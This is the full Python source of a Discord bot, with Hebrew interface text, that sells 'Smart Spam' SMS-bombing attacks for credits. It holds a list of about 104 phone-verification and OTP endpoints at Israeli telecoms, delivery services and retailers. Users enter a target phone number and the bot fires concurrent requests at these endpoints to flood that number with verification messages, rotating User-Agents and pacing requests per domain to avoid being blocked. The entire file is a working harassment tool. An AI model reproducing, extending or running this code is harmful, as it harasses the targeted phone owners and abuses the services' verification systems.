import discord
from discord.ext import commands
from discord import app_commands, ui
import asyncio
import aiohttp
import random
import os
import sys
from motor.motor_asyncio import AsyncIOMotorClient
from datetime import datetime, timedelta
import logging
import json
import time
import uuid

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

MONGO_URI = os.getenv("MONGO_URI")
TOKEN = os.getenv("DISCORD_TOKEN")

if not MONGO_URI or not TOKEN:
    logging.error("❌ Missing environment variables!")
    sys.exit(1)

try:
    cluster = AsyncIOMotorClient(MONGO_URI)
    db = cluster["cyberbot"]
    users_col = db["users"]
    logging.info("✅ Connected to MongoDB on Railway")
except Exception as e:
    logging.error(f"❌ Failed to connect to MongoDB: {e}")
    sys.exit(1)

# ========== רול מורשה ==========
ALLOWED_ROLE_ID = 1480762750052601886

class CyberBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        intents.members = True
        super().__init__(command_prefix='!', intents=intents)
        self.start_time = datetime.now()
        self.active_attacks = {}
        self.last_request = {}
    
    async def setup_hook(self):
        await self.tree.sync()
        logging.info(f"🔱 OMNI-TOTAL-WAR BOT IS ONLINE")

bot = CyberBot()

# ========== בדיקת רול ==========
async def check_allowed_role(interaction: discord.Interaction) -> bool:
    if not interaction.guild:
        await interaction.response.send_message("❌ הפקודה זמינה רק בשרת!", ephemeral=True)
        return False
    
    member = interaction.user
    if isinstance(member, discord.Member):
        if any(role.id == ALLOWED_ROLE_ID for role in member.roles):
            return True
    
    await interaction.response.send_message(f"❌ רק משתמשים עם רול <@&{ALLOWED_ROLE_ID}> יכולים להשתמש בפקודה זו!", ephemeral=True)
    return False

# ========== USER AGENTS ==========
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
]

# ========== APIS - 104 APIs ==========
APIS = [
    # --- YAD2 Israel (2026 endpoints) ---
    {"name": "Yad2_Register", "url": "https://www.yad2.co.il/api/auth/register", "data": {"phone": "PHONE", "action": "send_otp"}},
    {"name": "Yad2_SMS", "url": "https://api.yad2.co.il/v1/auth/sms-send", "data": {"msisdn": "PHONE", "country": "IL"}},
    {"name": "Yad2_New", "url": "https://new.yad2.co.il/api/user/register", "data": {"phoneNumber": "PHONE"}},
    
    # --- WOLT Israel ---
    {"name": "Wolt_Restaurant", "url": "https://restaurant.wolt.com/il/api/v1/customers/phone-verification", "data": {"phone_number": "PHONE"}},
    {"name": "Wolt_V8", "url": "https://wolt.com/api/v8/customers/phone-number-validation", "data": {"phone_number": "PHONE"}},
    {"name": "Wolt_App", "url": "https://app.wolt.com/api/v1/otp/send", "data": {"phone": "PHONE", "country": "IL"}},
    {"name": "Wolt_Verify", "url": "https://wolt.com/api/v1/customers/verify-phone", "data": {"phone_number": "PHONE"}},
    
    # --- PayBox Israel ---
    {"name": "PayBox_OTP", "url": "https://api.payboxapp.com/v1/auth/otp/send", "data": {"phone": "PHONE"}},
    {"name": "PayBox_Register", "url": "https://payboxapp.com/api/v1/users/register-phone", "data": {"msisdn": "PHONE"}},
    {"name": "PayBox_IR", "url": "https://paybox.ir/api/v1/phone-verify", "data": {"phone_number": "PHONE"}},
    
    # --- 019 Mobile Israel ---
    {"name": "019_Send", "url": "https://019sms.co.il/api/v1/send", "data": {"phone": "PHONE", "text": "OTP verification"}},
    {"name": "019_Docs", "url": "https://docs.019sms.co.il/api/send-sms", "data": {"msisdn": "PHONE", "message": "Code"}},
    {"name": "019_API", "url": "https://019sms.co.il/api", "data": {"recipients": ["PHONE"], "sms": {"content": [{"text": "Verify"}]}}},
    
    # --- Cellcom Israel ---
    {"name": "Cellcom_Shop", "url": "https://eshop.cellcom.co.il/api/auth/send-sms", "data": {"phoneNumber": "PHONE"}},
    {"name": "Cellcom_My", "url": "https://my.cellcom.co.il/api/v1/registration/sms-otp", "data": {"phone": "PHONE"}},
    {"name": "Cellcom_API", "url": "https://api.cellcom.co.il/v1/auth/phone-verify", "data": {"msisdn": "PHONE"}},
    
    # --- Partner Israel ---
    {"name": "Partner_Verify", "url": "https://www.partner.co.il/api/v1/auth/phone-verify", "data": {"phone": "PHONE"}},
    {"name": "Partner_OTP", "url": "https://eshop.partner.co.il/api/register/send-otp", "data": {"phoneNumber": "PHONE"}},
    {"name": "Partner_Orange", "url": "https://my.orange.co.il/api/v1/otp/send-sms", "data": {"msisdn": "PHONE"}},
    
    # --- HOT Mobile Israel ---
    {"name": "HOT_SMS", "url": "https://www.hotmobile.co.il/api/v1/auth/sms-code-send", "data": {"phone": "PHONE"}},
    {"name": "HOT_App", "url": "https://hotmobile-app.com/api/v1/register/phone-verify", "data": {"phoneNumber": "PHONE"}},
    {"name": "HOT_API", "url": "https://api.hot.co.il/v1/user/phone-otp", "data": {"msisdn": "PHONE"}},
    
    # --- Pelephone Israel ---
    {"name": "Pelephone_Reg", "url": "https://www.pelephone.co.il/api/v1/registration/sms-send", "data": {"phone": "PHONE"}},
    {"name": "Pelephone_My", "url": "https://my.pelephone.net/api/auth/verify-phone", "data": {"phoneNumber": "PHONE"}},
    {"name": "Pelephone_API", "url": "https://api.pelephone.co.il/v1/otp/send", "data": {"msisdn": "PHONE"}},
    
    # --- 10bis Israel ---
    {"name": "10bis_Reg", "url": "https://www.10bis.co.il/api/v1/auth/phone-register", "data": {"phone": "PHONE"}},
    {"name": "10bis_API", "url": "https://api.10bis.co.il/register/send-sms", "data": {"msisdn": "PHONE"}},
    {"name": "10bis_App", "url": "https://app.10bis.co.il/api/v1/verify-phone", "data": {"phoneNumber": "PHONE"}},
    
    # --- Dominos Israel ---
    {"name": "Dominos_OTP", "url": "https://www.dominos.co.il/api/v1/auth/sms-otp", "data": {"phone": "PHONE"}},
    {"name": "Dominos_Order", "url": "https://order.dominos.co.il/api/register/phone", "data": {"phoneNumber": "PHONE"}},
    
    # --- Bezeq Israel ---
    {"name": "Bezeq_SMS", "url": "https://www.bezeq.co.il/api/v1/auth/send-sms", "data": {"phone": "PHONE"}},
    {"name": "Bezeq_My", "url": "https://my.bezeq.co.il/api/register/otp", "data": {"msisdn": "PHONE"}},
    
    # --- Israeli services 2026 ---
    {"name": "SuperPharm", "url": "https://www.super-pharm.co.il/api/v1/auth/phone-verify", "data": {"phone": "PHONE"}},
    {"name": "Ivory", "url": "https://www.ivory.co.il/api/register/sms", "data": {"phoneNumber": "PHONE"}},
    {"name": "Zap", "url": "https://www.zap.co.il/api/v1/user/phone-otp", "data": {"msisdn": "PHONE"}},
    {"name": "Castro", "url": "https://www.castro.co.il/api/auth/send-code", "data": {"phone": "PHONE"}},
    {"name": "TenBis", "url": "https://tenbis.co.il/api/v2/phone-verification", "data": {"phone": "PHONE"}},
    {"name": "Rest", "url": "https://www.rest.co.il/api/v1/register/sms", "data": {"phoneNumber": "PHONE"}},
    {"name": "Gett", "url": "https://www.gett.com/il/api/v1/auth/otp-send", "data": {"phone": "PHONE"}},
    {"name": "Bit", "url": "https://www.bit.co.il/api/v1/user/phone-verify", "data": {"msisdn": "PHONE"}},
    
    # --- QUICK-LOGIN ENGINE ---
    {"name": "Quick247", "url": "https://oidc.quick-login.com/authorize", "data": {"client_id": "quicklogin-twentyfourseven-israel", "phone_number": "PHONE_INTL", "lang": "he"}},
    {"name": "QuickRenuar", "url": "https://oidc.quick-login.com/authorize", "data": {"client_id": "quicklogin-renuar-israel", "phone_number": "PHONE_INTL", "lang": "he"}},
    {"name": "QuickAldo", "url": "https://oidc.quick-login.com/authorize", "data": {"client_id": "quicklogin-aldoshoes-israel", "phone_number": "PHONE_INTL", "lang": "he"}},
    {"name": "QuickBillabong", "url": "https://oidc.quick-login.com/authorize", "data": {"client_id": "quicklogin-billabong-israel", "phone_number": "PHONE_INTL", "lang": "he"}},
    {"name": "QuickSacks", "url": "https://oidc.quick-login.com/authorize", "data": {"client_id": "quicklogin-sacks-israel", "phone_number": "PHONE_INTL", "lang": "he"}},
    {"name": "QuickJackKuba", "url": "https://oidc.quick-login.com/authorize", "data": {"client_id": "quicklogin-jackkuba-israel", "phone_number": "PHONE_INTL", "lang": "he"}},
    {"name": "QuickNaot", "url": "https://oidc.quick-login.com/authorize", "data": {"client_id": "quicklogin-naot-israel", "phone_number": "PHONE_INTL", "lang": "he"}},
    {"name": "QuickSteve", "url": "https://oidc.quick-login.com/authorize", "data": {"client_id": "quicklogin-stevemadden-israel", "phone_number": "PHONE_INTL", "lang": "he"}},
    {"name": "QuickReplay", "url": "https://oidc.quick-login.com/authorize", "data": {"client_id": "quicklogin-replay-israel", "phone_number": "PHONE_INTL", "lang": "he"}},
    {"name": "QuickMagnolia", "url": "https://oidc.quick-login.com/authorize", "data": {"client_id": "quicklogin-magnolia-israel", "phone_number": "PHONE_INTL", "lang": "he"}},
    
    # --- FOX GROUP ---
    {"name": "FoxHome", "url": "https://api.foxhome.co.il/v1/auth/otp", "data": {"phone": "PHONE_RAW"}},
    {"name": "Laline", "url": "https://api.laline.co.il/v1/auth/otp", "data": {"phone": "PHONE_RAW"}},
    {"name": "TerminalX", "url": "https://api.terminalx.com/v1/auth/otp", "data": {"phone": "PHONE_RAW"}},
    {"name": "Fox", "url": "https://api.fox.co.il/v1/auth/otp", "data": {"phone": "PHONE_RAW"}},
    {"name": "AmericanEagle", "url": "https://api.american-eagle.co.il/v1/auth/otp", "data": {"phone": "PHONE_RAW"}},
    {"name": "Billabong", "url": "https://api.billabong.co.il/v1/auth/otp", "data": {"phone": "PHONE_RAW"}},
    {"name": "SunglassHut", "url": "https://api.sunglasshut.co.il/v1/auth/otp", "data": {"phone": "PHONE_RAW"}},
    
    # --- FOOD & RESTAURANTS ---
    {"name": "RosTabit", "url": "https://ros-rp-beta.tabit.cloud/services/loyalty/customerProfile/auth/mobile", "data": {"mobile": "PHONE_RAW"}},
    {"name": "Dominos", "url": "https://api.dominos.co.il/sendOtp", "data": {"otpMethod": "text", "customerId": "PHONE_RAW", "language": "he"}},
    {"name": "10bis_Next", "url": "https://www.10bis.co.il/NextApi/GetActivationTokenAndSendActivationCodeToUser", "method": "GET", "params": {"culture": "he-IL", "cellPhone": "PHONE_RAW"}},
    {"name": "PapaJohns", "url": "https://www.papajohns.co.il/_a/aff_otp_auth", "type": "form", "data": "phone=PHONE"},
    {"name": "BurgerAnch", "url": "https://app.burgeranch.co.il/_a/aff_otp_auth", "type": "form", "data": "phone=PHONE"},
    {"name": "McDonalds", "url": "https://api.mcdonalds.co.il/v1/auth/otp", "data": {"phone": "PHONE_RAW"}},
    {"name": "PizzaHut", "url": "https://www.pizzahut.co.il/api/v1/auth/otp", "data": {"phone": "PHONE_RAW"}},
    
    # --- MAGENTO CLUSTER ---
    {"name": "Castro", "url": "https://www.castro.com/customer/ajax/post/", "type": "magento"},
    {"name": "Hoodies", "url": "https://www.hoodies.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Urbanica", "url": "https://www.urbanica-wh.com/customer/ajax/post/", "type": "magento"},
    {"name": "Delta", "url": "https://www.delta.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Weshoes", "url": "https://www.weshoes.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Fix", "url": "https://www.fixunderwear.com/customer/ajax/post/", "type": "magento"},
    {"name": "Intima", "url": "https://www.intima-il.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Golf", "url": "https://www.golf-il.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Timberland", "url": "https://www.timberland.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Adika", "url": "https://www.adikastyle.com/customer/ajax/post/", "type": "magento"},
    {"name": "NineWest", "url": "https://www.ninewest.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Gali", "url": "https://www.gali.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Onot", "url": "https://www.onot.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Nike", "url": "https://www.nike.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Adidas", "url": "https://www.adidas.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Puma", "url": "https://www.puma.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Renoir", "url": "https://www.renuar.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Laline", "url": "https://www.laline.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Gefen", "url": "https://www.gefen.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Avramito", "url": "https://www.avramito.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "RedHot", "url": "https://www.redhot.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Buffalo", "url": "https://www.buffalo.co.il/customer/ajax/post/", "type": "magento"},
    
    # --- SERVICES & TECH ---
    {"name": "Cellcom_Digital", "url": "https://digital-api.cellcom.co.il/api/otp/LoginStep1", "method": "PUT", "data": {"Subscriber": "PHONE_RAW", "OtpOrigin": "main OTP"}},
    {"name": "MyOffer", "url": "https://server.myofer.co.il/api/sendAuthSms", "data": {"phoneNumber": "PHONE_RAW"}},
    {"name": "Hamal", "url": "https://users-auth.hamal.co.il/auth/send-auth-code", "data": {"value": "PHONE_RAW", "type": "phone", "projectId": "1"}},
    {"name": "Pango", "url": "https://api.pango.co.il/auth/otp", "data": {"phoneNumber": "PHONE_RAW"}},
    {"name": "Shufersal", "url": "https://www.shufersal.co.il/api/v1/auth/otp", "data": {"phone": "PHONE_RAW"}},
    {"name": "BePharm", "url": "https://www.bepharm.co.il/api/v1/auth/otp", "data": {"phone": "PHONE_RAW"}},
    {"name": "GoodPharm", "url": "https://www.goodpharm.co.il/api/v1/auth/otp", "data": {"phone": "PHONE_RAW"}},
    {"name": "Globes", "url": "https://www.globes.co.il/api/v1/auth/otp", "data": {"phone": "PHONE_RAW"}},
    {"name": "Groo", "url": "https://www.groo.co.il/api/v1/auth/otp", "data": {"phone": "PHONE_RAW"}},
    {"name": "Yellow", "url": "https://www.yellow.co.il/api/v1/auth/otp", "data": {"phone": "PHONE_RAW"}},
    {"name": "Walla", "url": "https://api.walla.co.il/v1/auth/otp", "data": {"phone": "PHONE_RAW"}},
]

print(f"📊 טענתי {len(APIS)} APIs!")

# ========== פונקציות שליחה ==========
async def send_magento(session, url, phone_raw, domain_delays):
    domain = url.split('/')[2]
    last_time = domain_delays.get(domain, 0)
    now = time.time()
    if now - last_time < 1.5:
        await asyncio.sleep(1.5 - (now - last_time))
    
    data = {
        "type": "login",
        "telephone": phone_raw,
        "bot_validation": 1,
    }
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Requested-With": "XMLHttpRequest"
    }
    try:
        async with session.post(url, data=data, headers=headers, timeout=8) as resp:
            domain_delays[domain] = time.time()
            return resp.status in [200, 201, 202]
    except:
        return False

async def send_api(session, api, phone, phone_raw, phone_intl, domain_delays):
    domain = api["url"].split('/')[2]
    last_time = domain_delays.get(domain, 0)
    now = time.time()
    if now - last_time < 1.5:
        await asyncio.sleep(1.5 - (now - last_time))
    
    try:
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        
        if api.get("method") == "GET":
            params = {}
            if "params" in api:
                for k, v in api["params"].items():
                    params[k] = v.replace("PHONE", phone).replace("PHONE_RAW", phone_raw).replace("PHONE_INTL", phone_intl)
            async with session.get(api["url"], params=params, headers=headers, timeout=8) as resp:
                domain_delays[domain] = time.time()
                return resp.status in [200, 201, 202, 204]
        
        elif api.get("type") == "form":
            headers["Content-Type"] = "application/x-www-form-urlencoded"
            data = api["data"].replace("PHONE", phone).replace("PHONE_RAW", phone_raw).replace("PHONE_INTL", phone_intl)
            async with session.post(api["url"], data=data, headers=headers, timeout=8) as resp:
                domain_delays[domain] = time.time()
                return resp.status in [200, 201, 202, 204]
        
        elif api.get("type") == "magento":
            return await send_magento(session, api["url"], phone_raw, domain_delays)
        
        else:
            headers["Content-Type"] = "application/json"
            data_str = json.dumps(api["data"])
            data_str = data_str.replace("PHONE", phone).replace("PHONE_RAW", phone_raw).replace("PHONE_INTL", phone_intl)
            data = json.loads(data_str)
            
            method = api.get("method", "POST")
            async with session.request(method, api["url"], json=data, headers=headers, timeout=8) as resp:
                domain_delays[domain] = time.time()
                return resp.status in [200, 201, 202, 204]
    except:
        return False

# ========== מתקפה ==========
async def smart_attack(phone, credits, user_id, interaction, attack_id):
    phone_raw = phone[3:] if phone.startswith("972") else phone[1:]
    phone_intl = f"+972{phone_raw}"
    
    duration_seconds = credits * 45
    duration_mins = duration_seconds // 60
    remaining_seconds = duration_seconds % 60
    
    end_time = datetime.now() + timedelta(seconds=duration_seconds)
    
    await interaction.followup.send(
        f"🎯 **SPAM STARTED**\n📱 {phone}\n⏱️ {credits} טוקנים = {duration_mins}ד {remaining_seconds}ש\n🎯 {len(APIS)} APIs\n🆔 מזהה מתקפה: {attack_id[:8]}",
        ephemeral=True
    )
    
    sessions = [aiohttp.ClientSession() for _ in range(3)]
    total_sent = 0
    last_report = 0
    domain_delays = {}
    
    try:
        while datetime.now() < end_time:
            if attack_id in bot.active_attacks and bot.active_attacks[attack_id].get("stop", False):
                await interaction.followup.send("🛑 **המתקפה הופסקה**", ephemeral=True)
                break
            
            tasks = []
            for session in sessions:
                for api in APIS:
                    if api.get("type") == "magento":
                        tasks.append(send_magento(session, api["url"], phone_raw, domain_delays))
                    else:
                        tasks.append(send_api(session, api, phone, phone_raw, phone_intl, domain_delays))
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            round_sent = sum(1 for r in results if r is True)
            total_sent += round_sent
            
            elapsed = int((datetime.now() - (end_time - timedelta(seconds=duration_seconds))).total_seconds())
            if elapsed - last_report >= 60:
                last_report = elapsed
                remaining = duration_seconds - elapsed
                rate = total_sent // (elapsed // 60) if elapsed >= 60 else 0
                await interaction.followup.send(f"📊 {elapsed//60}ד: {total_sent} | {rate}/דקה", ephemeral=True)
            
            await asyncio.sleep(random.uniform(0.8, 1.5))
    
    finally:
        for session in sessions:
            await session.close()
    
    if attack_id in bot.active_attacks:
        del bot.active_attacks[attack_id]
    
    await interaction.followup.send(f"✅ **FINISHED**\n📊 סה\"כ: {total_sent}", ephemeral=True)

# ========== פקודת עצירה ==========
async def stop_attacks_function(interaction: discord.Interaction):
    user_id = str(interaction.user.id)
    stopped = 0
    
    for attack_id, attack_data in list(bot.active_attacks.items()):
        if attack_data["user_id"] == user_id:
            bot.active_attacks[attack_id]["stop"] = True
            stopped += 1
    
    if stopped > 0:
        await interaction.response.send_message(f"🛑 **עצרתי {stopped} מתקפות**", ephemeral=True)
    else:
        await interaction.response.send_message("❌ אין לך מתקפות פעילות", ephemeral=True)

@bot.tree.command(name="stop", description="עצור את כל המתקפות")
async def stop_command(interaction: discord.Interaction):
    await stop_attacks_function(interaction)

@bot.tree.command(name="add_tokens", description="הוסף טוקנים (צוות)")
async def add_tokens(interaction: discord.Interaction, member: discord.Member, amount: int):
    if not await check_allowed_role(interaction):
        return
    
    user_id = str(member.id)
    await users_col.update_one(
        {"user_id": user_id},
        {"$inc": {"tokens": amount}},
        upsert=True
    )
    await interaction.response.send_message(f"✅ הוספת {amount} טוקנים ל{member.mention}", ephemeral=True)

@bot.tree.command(name="check", description="בדוק APIs (צוות)")
async def check_command(interaction: discord.Interaction):
    if not await check_allowed_role(interaction):
        return
    
    await interaction.response.send_message("🔍 בודק 20 APIs...", ephemeral=True)
    
    test_phone = "972501234567"
    test_raw = "0501234567"
    test_intl = "+972501234567"
    domain_delays = {}
    
    working = []
    
    async with aiohttp.ClientSession() as session:
        for i, api in enumerate(APIS[:20]):
            if api.get("type") == "magento":
                success = await send_magento(session, api["url"], test_raw, domain_delays)
            else:
                success = await send_api(session, api, test_phone, test_raw, test_intl, domain_delays)
            if success:
                working.append(api["name"])
            await asyncio.sleep(1)
    
    await interaction.followup.send(f"✅ **{len(working)}** עובדים:\n" + ", ".join(working[:10]), ephemeral=True)

# ========== פאנל ראשי ==========
class SpamModal(ui.Modal, title="Start Spam"):
    phone = ui.TextInput(label="Target Phone Number *", placeholder="972501234567")
    credits = ui.TextInput(label="Credits to use (max 100) *", placeholder="5")

    async def on_submit(self, interaction: discord.Interaction):
        phone = self.phone.value.strip()
        credits_str = self.credits.value.strip()
        
        if not phone.isdigit() or len(phone) < 9:
            await interaction.response.send_message("❌ מספר טלפון לא תקין", ephemeral=True)
            return
        
        if not phone.startswith("972"):
            await interaction.response.send_message("❌ מספר חייב להתחיל ב-972", ephemeral=True)
            return
        
        try:
            credits = int(credits_str)
            if credits < 1 or credits > 100:
                await interaction.response.send_message("❌ יש להזין 1-100 טוקנים", ephemeral=True)
                return
        except:
            await interaction.response.send_message("❌ מספר לא תקין", ephemeral=True)
            return
        
        user_id = str(interaction.user.id)
        user_doc = await users_col.find_one({"user_id": user_id})
        
        if not user_doc:
            await users_col.insert_one({"user_id": user_id, "tokens": 442})
            user_doc = {"tokens": 442}
        
        if user_doc.get("tokens", 0) < credits:
            await interaction.response.send_message(f"❌ אין לך מספיק טוקנים! יש לך {user_doc.get('tokens', 0)}", ephemeral=True)
            return
        
        await users_col.update_one({"user_id": user_id}, {"$inc": {"tokens": -credits}})
        
        attack_id = str(uuid.uuid4())[:8]
        bot.active_attacks[attack_id] = {"user_id": user_id, "stop": False}
        
        duration_seconds = credits * 45
        duration_mins = duration_seconds // 60
        remaining_sec = duration_seconds % 60
        
        await interaction.response.send_message(
            f"✅ **ACTIVATED**\n📱 {phone}\n🎯 {credits} טוקנים = {duration_mins}ד {remaining_sec}ש\n💎 נותרו: {user_doc['tokens'] - credits}\n🆔 מזהה: {attack_id}",
            ephemeral=True
        )
        
        asyncio.create_task(smart_attack(phone, credits, user_id, interaction, attack_id))

class MainPanel(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=180)
    
    @discord.ui.button(label="📱 Smart Spam", style=discord.ButtonStyle.danger, emoji="💣")
    async def spam_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(SpamModal())
    
    @discord.ui.button(label="💰 My Credits", style=discord.ButtonStyle.secondary, emoji="💎")
    async def credits_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        user_id = str(interaction.user.id)
        user_doc = await users_col.find_one({"user_id": user_id})
        tokens = user_doc.get("tokens", 442) if user_doc else 442
        await interaction.response.send_message(f"💎 יש לך **{tokens}** טוקנים", ephemeral=True)
    
    @discord.ui.button(label="🛑 STOP ALL", style=discord.ButtonStyle.primary, emoji="🛑")
    async def stop_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await stop_attacks_function(interaction)

@bot.tree.command(name="panel", description="פתח את פאנל השליטה")
async def panel(interaction: discord.Interaction):
    user_id = str(interaction.user.id)
    user_doc = await users_col.find_one({"user_id": user_id})
    tokens = user_doc.get("tokens", 442) if user_doc else 442
    
    embed = discord.Embed(
        title="Spam-Me Control Panel",
        description="Use the buttons below to interact with the bot.",
        color=0x2b2d31
    )
    embed.add_field(
        name="📱 **Smart Spam**",
        value="SMS & Calls (costs credits)",
        inline=False
    )
    embed.add_field(
        name="💰 Your Credits",
        value=f"**{tokens}** credits\n45 seconds",
        inline=True
    )
    embed.add_field(
        name="1 Credit",
        value=f"{len(APIS)} APIs · Cloudflare",
        inline=True
    )
    
    view = MainPanel()
    await interaction.response.send_message(embed=embed, view=view)

@bot.tree.command(name="tokens", description="בדוק טוקנים")
async def tokens_command(interaction: discord.Interaction):
    user_id = str(interaction.user.id)
    user_doc = await users_col.find_one({"user_id": user_id})
    tokens = user_doc.get("tokens", 0) if user_doc else 0
    await interaction.response.send_message(f"💎 יש לך {tokens} טוקנים (כל טוקן = 45 שניות)", ephemeral=True)

@bot.tree.error
async def on_app_command_error(interaction: discord.Interaction, error: app_commands.AppCommandError):
    if isinstance(error, app_commands.CheckFailure):
        pass
    else:
        try:
            await interaction.response.send_message(f"❌ שגיאה: {str(error)}", ephemeral=True)
        except:
            pass

if __name__ == "__main__":
    print(f"🎯 פאנל Spam-Me מוכן עם {len(APIS)} APIs!")
    print(f"🔒 רול מורשה: {ALLOWED_ROLE_ID}")
    print(f"⏱️ 1 טוקן = 45 שניות")
    bot.run(TOKEN)
